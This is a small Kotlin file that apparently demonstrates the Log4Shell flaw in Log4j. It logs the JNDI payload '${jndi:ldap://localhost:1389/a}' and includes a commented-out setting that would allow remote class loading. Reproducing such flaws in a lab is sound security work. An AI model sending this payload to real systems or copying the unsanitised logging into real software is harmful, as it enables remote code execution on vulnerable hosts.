package de.ra

import org.apache.logging.log4j.Level
import org.apache.logging.log4j.LogManager
import org.apache.logging.log4j.Logger
import org.apache.logging.log4j.core.config.Configurator

private val logger: Logger = LogManager.getLogger(Hello::javaClass)

fun logoutLogging(userName: String): Unit {
    if (validLoggedInUserName(userName)) {
        logger.info("User $userName is logged out successfully.")
    } else {
        logger.info("$userName is invalid username.")
    }
}

class Hello {
    companion object {
        private val logger: Logger = LogManager.getLogger(Hello::javaClass)
    }

    fun main() {
        println("Hello hi how are you")
        Configurator.setLevel("", Level.INFO)
        logger.atInfo()
        println("Check = " + logger.isInfoEnabled)

        val userName = "\${jndi:ldap://localhost:1389/a}"
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true")
        logger.info(userName)
    }
}

//fun main() {
//    Hello().main()
//}